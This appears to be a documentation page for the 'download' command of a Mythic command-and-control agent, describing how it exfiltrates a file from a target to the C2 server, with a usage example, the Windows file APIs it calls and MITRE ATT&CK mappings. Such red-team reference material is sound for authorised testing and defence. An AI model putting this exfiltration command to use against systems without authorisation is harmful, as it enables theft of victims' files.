+++
title = "download"
chapter = false
weight = 103
+++

## Summary

Download (exfiltrate) a file from the target to the Mythic server.

- **Needs Admin:** False
- **Version:** 1
- **Author:** @Lavender-exe

### Arguments

- **file** (String, required) - Full path of the file to download from the target.

### Usage

```
download C:\Users\jsmith\Documents\sensitive.docx
```

## Detailed Summary

Opens the target file with `CreateFileA` for read-only access. The file is read in 8192-byte chunks via a `ReadFile` loop. The response includes the filename, file size (as a 32-bit integer), and the file content.

### APIs Used

| API | Purpose |
|-----|---------|
| `CreateFileA` | Open file for reading |
| `GetFileSize` | Determine total file size |
| `ReadFile` | Read file chunks (8192 bytes per read) |
| `CloseHandle` | Close file handle |

## MITRE ATT&CK Mapping

- **T1041** - Exfiltration Over C2 Channel
- **T1005** - Data from Local System

## Limitations

- File size is sent as a 32-bit integer - files larger than 4GB are not supported.
